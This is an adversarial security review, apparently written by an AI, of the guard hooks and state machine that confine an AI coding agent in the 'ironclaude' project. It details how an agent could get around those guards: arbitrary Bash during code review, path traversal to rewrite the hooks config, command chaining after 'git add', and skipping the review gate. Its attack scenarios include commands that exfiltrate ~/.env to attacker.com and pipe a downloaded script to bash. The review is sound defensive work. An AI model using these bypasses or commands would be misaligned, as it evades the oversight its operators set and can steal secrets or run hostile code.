# Adversarial Security Review R10

> **Date:** 2026-03-30
> **Reviewer:** Claude (Directive #231)
> **Scope:** All files in `commander/src/ironclaude/`, `commander/tests/`, `worker/hooks/`, `worker/skills/`, `worker/mcp-servers/`
> **Previous Rounds:** R1-R9 (all fixes verified)

## Executive Summary

Twelfth security assessment (tenth adversarial review) of the ironclaude codebase. Five new findings identified: 3 MEDIUM, 2 LOW. All five R9 fixes are correctly implemented with no regressions or bypasses.

The most impactful finding is that the "reviewing" workflow stage grants unrestricted Bash access beyond what was intended: the code comment says "sqlite3 queries, git diff, test runners" but the implementation allows any Bash command except git commit/push/merge/rebase. The second finding is a path traversal in the memory file whitelist: bash `[[ ]]` glob matching treats `*` as matching `/`, so a path containing `..` components can escape the memory directory while still matching the glob pattern. The third finding is that the `git add` and `make test` pattern-match exceptions in non-executing stages allow command chaining — any command containing "git add" anywhere in it is allowed regardless of what other commands are chained after it. The two LOW findings are an unescaped mrkdwn injection in `format_objective_received` (inconsistent with other formatters that do escape) and a missing prerequisite check in `mark_executing` that allows skipping code review.

This review includes a testing theatre audit and false positive analysis.

---

## Findings

### M1: Unrestricted Bash During Reviewing Stage

**Severity:** MEDIUM
**File:** `worker/hooks/professional-mode-guard.sh:198-201`
**Context:** Professional mode active, workflow stage `reviewing`

#### Description

When the workflow stage is not `executing`, the hook applies a series of pattern-based exceptions before blocking all write tools at line 207. The reviewing stage exception at lines 198-201 allows any Bash command unconditionally:

```bash
# Exception: allow Bash during code review (sqlite3 queries, git diff, test runners)
if [ "$TOOL_NAME" = "Bash" ] && [ "$WORKFLOW" = "reviewing" ]; then
  log_hook "professional-mode-guard" "Allowed" "bash during code review"
  exit 0
fi
```

The comment describes the intended scope as "sqlite3 queries, git diff, test runners" but the implementation has no command filtering. The git commit/push/merge/rebase check at line 180 fires before this exception, so those specific git operations are blocked. Everything else is allowed.

#### Attack Scenario

1. Worker submits a task for review (`submit_task`) — `review_pending=1`.
2. Code review skill is invoked — `skill-state-bridge.sh` transitions to `reviewing` stage.
3. During the reviewing stage (before review completes), the model runs arbitrary Bash commands:
   - `rm -rf important/directory/` — destructive filesystem operations
   - `curl http://attacker.com/exfil?data=$(cat ~/.env)` — data exfiltration
   - `python3 -c 'import os; os.system("arbitrary")'` — arbitrary code execution
   - `echo "malicious" > src/important_file.py` — file modification via echo (bypasses Edit tool restrictions)
4. These commands execute without any allowed_files check because the Bash tool does not go through the file access whitelist (line 220 only checks Edit/Write/MultiEdit/NotebookEdit).

#### Impact

A prompt-injected model in the reviewing stage can execute arbitrary system commands (except git commit/push/merge/rebase). The reviewing stage is reached during normal workflow operation — it's not an edge case. The intent is clearly to allow read-only operations for code review, but the implementation permits destructive operations. Writing files via `echo >` or `tee` bypasses all file access restrictions that apply to Edit/Write tools.

#### Suggested Fix

Replace the blanket allow with an allowlist of safe command patterns:

```bash
if [ "$TOOL_NAME" = "Bash" ] && [ "$WORKFLOW" = "reviewing" ]; then
  # Allow only read-only commands during code review
  if echo "$FILE_PATH" | grep -qE '^\s*(sqlite3|git\s+(diff|status|log|show|blame)|pytest|make\s+test|cat|head|tail|wc|grep|rg|find|ls)\b'; then
    log_hook "professional-mode-guard" "Allowed" "safe bash during code review"
    exit 0
  fi
  block_pretooluse "professional-mode-guard" "BLOCKED — ONLY READ-ONLY COMMANDS DURING REVIEW

Only sqlite3, git diff/status/log, pytest, make test, and read-only tools are allowed during code review.

Do NOT run destructive commands during the reviewing stage."
fi
```

---

### M2: Memory File Path Traversal via `..` Components

**Severity:** MEDIUM
**File:** `worker/hooks/professional-mode-guard.sh:158-163`
**Context:** Professional mode active (ON), any workflow stage

#### Description

The memory file whitelist at lines 158-163 allows Edit/Write to memory files regardless of workflow stage:

```bash
# Allow writes to auto-memory files regardless of workflow stage
if [[ "$TOOL_NAME" == "Edit" || "$TOOL_NAME" == "Write" ]]; then
  if [[ "$FILE_PATH" == "$HOME/.claude/projects/"*"/memory/"* ]]; then
    log_hook "professional-mode-guard" "Allowed" "memory file"
    exit 0
  fi
fi
```

In bash `[[ ]]` pattern matching, `*` matches any character including `/` (unlike pathname expansion where `*` does not match `/`). The `normalize_path` function (hook-logger.sh:50-52) only converts backslashes to forward slashes — it does not resolve `..` components, canonicalize paths, or follow symlinks.

A path like `$HOME/.claude/projects/proj/memory/../../CLAUDE.md` matches the pattern because:
- `$HOME/.claude/projects/` matches the literal prefix
- First `*` matches `proj` (a single path component is fine)
- `/memory/` matches literally
- Second `*` matches `../../CLAUDE.md` (including the `/` characters)

The actual file written is `$HOME/.claude/CLAUDE.md`, which is outside the memory directory.

#### Attack Scenario

1. Model is in any workflow stage (including brainstorming, idle, etc.) where Edit/Write are otherwise blocked.
2. Model calls `Write(file_path="/Users/roberthyatt/.claude/projects/-Users-roberthyatt-Code-ironclaude/memory/../../ironclaude-hooks-config.json", content='{"professional_mode_required": false}')`.
3. Hook sees `FILE_PATH` containing `/memory/` and the glob pattern matches.
4. Hook allows the write as "memory file" and exits 0.
5. Actual file written is `$HOME/.claude/ironclaude-hooks-config.json` — the hooks config file.
6. Model has now modified hook behavior from any workflow stage.

More severe variant: writing to `CLAUDE.md` to inject instructions, or to `ironclaude.db` to corrupt state.

#### Impact

Bypasses workflow stage restrictions entirely. The memory whitelist is the only path that allows writes in non-executing stages (other than docs/ paths with their own restrictions). A path traversal here gives unrestricted write access to any file reachable via `..` from the memory directory, at any workflow stage.

#### Suggested Fix

Canonicalize the path before checking the pattern. Use `realpath` (or at minimum strip `..` components):

```bash
if [[ "$TOOL_NAME" == "Edit" || "$TOOL_NAME" == "Write" ]]; then
  # Resolve symlinks and .. before checking
  CANONICAL_PATH=$(realpath -m "$FILE_PATH" 2>/dev/null || echo "$FILE_PATH")
  MEMORY_DIR="$HOME/.claude/projects/"
  if [[ "$CANONICAL_PATH" == "$MEMORY_DIR"*"/memory/"* ]]; then
    # Double-check: no .. components remain after canonicalization
    if [[ "$CANONICAL_PATH" != *".."* ]]; then
      log_hook "professional-mode-guard" "Allowed" "memory file"
      exit 0
    fi
  fi
fi
```

---

### M3: Command Chaining via Git Add / Make Test Patterns

**Severity:** MEDIUM
**File:** `worker/hooks/professional-mode-guard.sh:188, 203, 279`
**Context:** Professional mode active, non-executing workflow stages (brainstorming, design_ready, plan_ready, idle)

#### Description

In non-executing stages, the hook allows Bash commands matching specific patterns before blocking all other Bash at line 207. The patterns use `grep -qE` to check if the command *contains* the pattern anywhere:

```bash
# Line 188 (non-executing):
if [ "$TOOL_NAME" = "Bash" ] && echo "$FILE_PATH" | grep -qE '\bgit\s+add\b'; then
  log_hook "professional-mode-guard" "Allowed" "git staging"
  exit 0
fi

# Line 203 (non-executing):
if [ "$TOOL_NAME" = "Bash" ] && echo "$FILE_PATH" | grep -qE '\bmake\s+test'; then
  log_hook "professional-mode-guard" "Allowed" "make test* command"
  exit 0
fi

# Line 279 (executing):
if echo "$FILE_PATH" | grep -qE '\bgit\s+add\b'; then
  log_hook "professional-mode-guard" "Allowed" "git staging"
  exit 0
fi
```

The `grep` checks whether the pattern exists *anywhere* in the command string. A command like `git add file ; rm -rf /` matches `\bgit\s+add\b` and is allowed, even though it chains a destructive command after the git add.

The git commit/push/merge/rebase block at line 180 catches some chained git commands (e.g., `git add . && git push` is blocked because "push" appears in the string). But non-git dangerous commands are not caught.

#### Attack Scenario

1. Worker is in brainstorming stage (write tools blocked).
2. Worker runs: `Bash(command="git add /dev/null ; curl http://attacker.com/payload.sh | bash")`
3. Line 180: no match (no commit/push/merge/rebase in string).
4. Line 188: `\bgit\s+add\b` matches "git add" — ALLOWED, exit 0.
5. Both `git add /dev/null` and `curl ... | bash` execute.

Same pattern works with make test:
- `make test || rm -rf src/` — matches `\bmake\s+test` and is allowed.

#### Impact

In non-executing stages where Bash should be heavily restricted, command chaining allows arbitrary command execution by prefixing with `git add <something> ;` or `make test ||`. This bypasses the "write tools not allowed" restriction at line 207. In executing stages, the impact is lower since Bash is already broadly permitted, but the git add exception at line 279 still allows bypassing the review_pending gate (review_pending blocks Bash at line 289, but the git add exit at line 279 fires first).

#### Suggested Fix

Validate that the command is *only* the allowed pattern, not that it *contains* the pattern. Use anchored matching and reject commands with shell operators:

```bash
# Reject commands with shell chaining operators
if echo "$FILE_PATH" | grep -qE '[;&|]'; then
  # Contains chaining — fall through to normal enforcement
  :
elif echo "$FILE_PATH" | grep -qE '^\s*git\s+add\b'; then
  log_hook "professional-mode-guard" "Allowed" "git staging"
  exit 0
fi
```

Or more robustly, check that the entire command matches the safe pattern:

```bash
if echo "$FILE_PATH" | grep -qP '^\s*git\s+add\s+[^;&|`$()]+$'; then
  log_hook "professional-mode-guard" "Allowed" "git staging"
  exit 0
fi
```

---

### L1: Unescaped mrkdwn in `format_objective_received`

**Severity:** LOW
**File:** `commander/src/ironclaude/notifications.py:79-80`, called at `commander/src/ironclaude/main.py:314`
**Context:** Operator sends `/objective` Slack command with text containing mrkdwn metacharacters

#### Description

`format_objective_received` embeds operator-provided text directly into a Slack message without applying `_escape_mrkdwn()`:

```python
def format_objective_received(text: str) -> str:
    return f"*New Objective:* {text}\nDecomposing into tasks..."
```

This is called at main.py:314:
```python
self.slack.post_message(format_objective_received(text))
```

The same `text` value is correctly escaped two lines later in `format_worker_spawned` (notifications.py:24):
```python
f"Objective: {_escape_mrkdwn(objective)}"
```

This inconsistency means the objective text is rendered with raw mrkdwn in the first Slack message but escaped in the second.

#### Attack Scenario

1. Operator sends: `/objective Check <https://evil.com|this safe-looking link> for details`
2. Slack renders `format_objective_received` output with a clickable link that shows "this safe-looking link" but navigates to `evil.com`.
3. If another operator clicks the link, they're redirected to a malicious site.

More practically: an operator pastes text containing `<@U12345>` which triggers an unwanted Slack mention, or `&amp;` entities that render incorrectly.

#### Impact

Low — the operator is the one providing the text, so self-injection is the primary vector. The risk is that an operator pastes text from an untrusted source (e.g., a bug report containing mrkdwn metacharacters) and the Slack message renders unexpectedly. The `<` and `>` characters are the security-relevant metacharacters (they enable link creation and user mentions); `_escape_mrkdwn()` already handles these.

#### Suggested Fix

Apply `_escape_mrkdwn()` consistently:

```python
def format_objective_received(text: str) -> str:
    return f"*New Objective:* {_escape_mrkdwn(text)}\nDecomposing into tasks..."
```

---

### L2: `mark_executing` Callable Without Prior `record_review_verdict`

**Severity:** LOW
**File:** `worker/mcp-servers/state-manager/src/tools/write-tools.ts:1057-1070`
**Context:** Workflow stage `reviewing`

#### Description

The `mark_executing` tool transitions from `reviewing` back to `executing` and clears `review_pending`:

```typescript
case 'mark_executing': {
  const session = getSession(db, resolvedId);
  if (!session) {
    return err('Session not found', { session_id: resolvedId });
  }

  if (session.workflow_stage !== 'reviewing') {
    return err(
      `Cannot mark executing: workflow_stage must be 'reviewing', got '${session.workflow_stage}'`,
    );
  }

  updateSession(db, resolvedId, { workflow_stage: 'executing', review_pending: 0 });
```

The only prerequisite check is `workflow_stage === 'reviewing'`. There is no check that `record_review_verdict` was called with a passing grade (A or B) before allowing the transition. A model in the reviewing stage can call `mark_executing` directly, clearing `review_pending` and returning to executing without any review verdict being recorded.

The normal flow is: `submit_task` → code-review skill → `record_review_verdict(grade: 'A')` → `mark_executing`. But nothing enforces that `record_review_verdict` precedes `mark_executing`.

#### Attack Scenario

1. Worker completes a task and calls `submit_task` — `review_pending=1`, workflow stays `executing`.
2. Code review skill is invoked — transitions to `reviewing` via `skill-state-bridge.sh`.
3. Instead of running the actual code review, model calls `mark_executing` directly.
4. `mark_executing` succeeds: `review_pending=0`, workflow back to `executing`.
5. Worker continues to next task with no review verdict recorded.

#### Impact

Defense-in-depth gap. The code review skill is the primary enforcement mechanism, and the model must explicitly invoke `mark_executing` as an MCP tool call — this isn't an accidental path. The audit log records `mark_executing` without a preceding `record_review_verdict`, so the skip is detectable. However, a prompt-injected model could use this to bypass the mandatory review gate systematically.

Submitted tasks remain in `submitted` status (not advanced to `review_passed`) when `record_review_verdict` is skipped, which may cause wave advancement issues later. But the model can still modify files in the current wave's allowed list.

#### Suggested Fix

Check that `record_review_verdict` was called before allowing `mark_executing`:

```typescript
case 'mark_executing': {
  // ... existing session check ...

  // Verify a passing review was recorded for the current wave
  const passingReview = db.prepare(
    `SELECT 1 FROM review_grades
     WHERE terminal_session = ? AND wave_number = ? AND grade IN ('A', 'B')
     ORDER BY graded_at DESC LIMIT 1`
  ).get(resolvedId, session.current_wave);

  if (!passingReview) {
    return err(
      'Cannot mark executing: no passing review verdict (A or B) recorded for current wave. ' +
      'Call record_review_verdict first.'
    );
  }

  updateSession(db, resolvedId, { workflow_stage: 'executing', review_pending: 0 });
```

---

## R9 Fix Verification

All five R9 fixes verified as correctly implemented with no regressions:

| R9 ID | Fix | Status | Verification |
|-------|-----|--------|--------------|
| M1 | MultiEdit added to `review_pending` gate | VERIFIED | professional-mode-guard.sh:289 — `"$TOOL_NAME" == "MultiEdit"` now included alongside Edit, Write, Bash, NotebookEdit. Commit 3b57c15 |
| L1 | `collections.deque` in `get_worker_log` fallback | VERIFIED | orchestrator_mcp.py:1217 — `tail = collections.deque(f, maxlen=lines)` replaces `f.readlines()`. `collections` import present. Commit 98c37c0 |
| L2 | `ExitPlanMode` blocked alongside `EnterPlanMode` | VERIFIED | professional-mode-guard.sh:98 — `EnterPlanMode\|ExitPlanMode)` case branch. Error message updated to mention both tools. Commit 3b57c15 |
| R8 L2 | Scheme validation on redirect targets | VERIFIED | research_mcp.py:91-92 — `if parsed.scheme not in ('http', 'https'): raise ValueError(...)` at top of `_resolve_and_validate()`. Commit d37cce8 |
| R8 L1 | `_escape_mrkdwn()` in `format_heartbeat` | VERIFIED | notifications.py:49 — `desc = _escape_mrkdwn(w.get("description") or "no task")` applied before truncation. Commit c131d80 |

---

## False Positive Analysis

- **Double-space git command bypass:** Agent claimed `git  commit` (double space) bypasses `\bgit\b.*\b(commit|push|merge|rebase)\b`. FALSE — `\b` matches word boundaries on "git" and "commit" independently; `.*` matches any characters between them including multiple spaces. The regex correctly matches `git  commit`.
- **SQL injection via WAVE_NUM:** Agent claimed WAVE_NUM from sqlite3 could contain injection. FALSE — WAVE_NUM is an integer column read from sqlite3, then escaped with `sed "s/'/''/g"` before use in a single-quoted SQL literal. The escaping is correct for SQLite. Even if WAVE_NUM somehow contained `'`, it would be doubled to `''` which is a valid escaped single quote.
- **Tmux command injection via `send_keys`:** Agent claimed `subprocess.run(["tmux", "send-keys", "-t", name, text])` enables shell injection. FALSE — `subprocess.run` with a list argument does not invoke a shell; each element is passed as a separate argv entry. Tmux `send-keys` treats the argument as literal keystrokes, not shell commands. The text is sent to the running process in the tmux pane (Claude Code), not interpreted by a shell.
- **Git commit/push in reviewing stage:** Investigating M1, confirmed that the git commit/push/merge/rebase block at line 180 fires BEFORE the reviewing exception at line 198. Git destructive operations are correctly blocked even in reviewing stage. The M1 finding is limited to non-git commands.
- **`format_plan_ready`, `format_blocked`, `format_task_progress` unescaped:** These format functions do not apply `_escape_mrkdwn()`. However, they are imported at main.py:33 but NEVER called anywhere in the codebase. Still dead code — latent injection vectors that activate only if connected to a code path. Consistent with R9 false positive analysis.
- **`format_worker_checkin` unescaped:** Confirmed NOT a Slack issue — `format_worker_checkin` output goes to `brain.send_message()` at main.py:825, not to `slack.post_message()`. Consistent with R8 and R9 false positive analysis.

---

## Testing Theatre

### TT1: Tautological MCP Server Inclusion Test (Unchanged from R9)

**File:** `commander/tests/test_brain_client.py:822-832`
**Class:** `TestMCPDiscovery`

The test `test_brain_session_includes_research_mcp_in_mcp_servers` sets `_research_mcp_path = "/fake/research_mcp.py"` on line 825, then asserts `_research_mcp_path is not None` on line 830. This assertion can never fail — it verifies a value set three lines earlier. The test does not call `_brain_session()`, does not inspect the `mcp_servers` dict, and cannot detect a regression where `_brain_session` fails to include the research MCP in its server configuration.

### TT2: No Test for `mark_executing` Without Prior `record_review_verdict`

**File:** `worker/mcp-servers/state-manager/` (test gap)

There is no test verifying that `mark_executing` requires a passing review verdict. A test that calls `mark_executing` from `reviewing` stage WITHOUT first calling `record_review_verdict` should fail (after the L2 fix is applied). Currently such a test would pass because the prerequisite check doesn't exist.

### TT3: `test_spawn_session` Verifies Mock Interactions Only

**File:** `commander/tests/test_tmux_manager.py:40-47`

The test mocks `subprocess.run`, calls `spawn_session`, then asserts `len(calls) == 2` and `"worker-1" in calls[0].args[0]`. This verifies that subprocess.run was called twice with specific arguments, but does not verify that tmux actually created a session, that the command was valid, or that logging started. If subprocess.run silently fails (returncode != 0 but no exception), the test still passes.

### TT4: MCP Path Discovery Tests Assert Non-None Only

**File:** `commander/tests/test_brain_client.py:780-831`

`test_start_discovers_research_mcp_path` and `test_start_discovers_ollama_mcp_path` mock `_run_event_loop` to prevent threading, call `start()`, then assert `_research_mcp_path is not None` and `_ollama_mcp_path is not None`. The paths could be set to any arbitrary string and the tests pass. No verification that the paths point to real files, are executable, or match the expected MCP server location.

---

## Methodology

- **Full source read** of `professional-mode-guard.sh` (311 lines) with control-flow tracing for every tool name path, focusing on the non-executing stage exception chain (lines 178-217) and the executing stage checks (lines 219-303)
- **Full source read** of `hook-logger.sh` (467 lines) reviewing `normalize_path`, `db_read`, `db_read_or_fail`, SQL escaping patterns, and `SESSION_TAG` derivation
- **Full source read** of `notifications.py` (115 lines) checking every `format_*` function for `_escape_mrkdwn()` consistency and tracing each function's call site in `main.py`
- **Targeted read** of `state-machine.ts` retreat logic (lines 380-500), `RETREAT_SOURCES` (lines 126-135), and `mark_executing` (write-tools.ts:1057-1070) for state transition validation gaps
- **Targeted read** of `orchestrator_mcp.py` `get_worker_log` (lines 1205-1221) and `kill_worker` grading (lines 1223-1238)
- **Targeted read** of `research_mcp.py` `_resolve_and_validate` (lines 85-120) for SSRF protections
- **Targeted read** of `tmux_manager.py` `read_log_tail` (lines 126-134) and `send_keys` (lines 100-112)
- **Regex validation** of git command detection patterns (`\bgit\b.*\b(commit|push|merge|rebase)\b`) against edge cases (double space, command chaining, shell quoting)
- **Bash glob behavior analysis** of `[[ ]]` pattern matching confirming `*` matches `/` per POSIX fnmatch without FNM_PATHNAME
- **Two parallel Explore subagents** covering hooks/state-machine and daemon/MCP-servers, with findings validated against actual code before inclusion
- **Test audit** of all 19 test files in `commander/tests/` for testing theatre patterns
- **R9 fix verification** with line-number precision for all 5 commits
- **Nine attack surface categories** audited: Bash exception chain bypass, memory path traversal, command chaining, mrkdwn injection consistency, state machine transition gaps, SQL escaping, subprocess injection, resource exhaustion, testing theatre

---

## Risk Matrix

| ID | Severity | Exploitability | Impact | Requires |
|----|----------|----------------|--------|----------|
| M1 | MEDIUM | Easy | Arbitrary command execution (except git commit/push) during reviewing stage | Professional mode active, reviewing stage (normal workflow operation), model runs non-git destructive commands |
| M2 | MEDIUM | Easy | Write files outside memory directory at any workflow stage | Professional mode active, any stage, model constructs path with `..` components targeting memory whitelist |
| M3 | MEDIUM | Easy | Arbitrary command execution in non-executing stages via git add / make test prefix | Professional mode active, non-executing stage, model chains commands after `git add` or `make test` |
| L1 | LOW | Easy | Slack mrkdwn rendering of operator-provided objective text | Operator sends `/objective` with text containing `<`, `>`, or `&` |
| L2 | LOW | Medium | Skip code review gate between tasks | Professional mode active, executing stage, model calls `mark_executing` directly from reviewing without `record_review_verdict` |
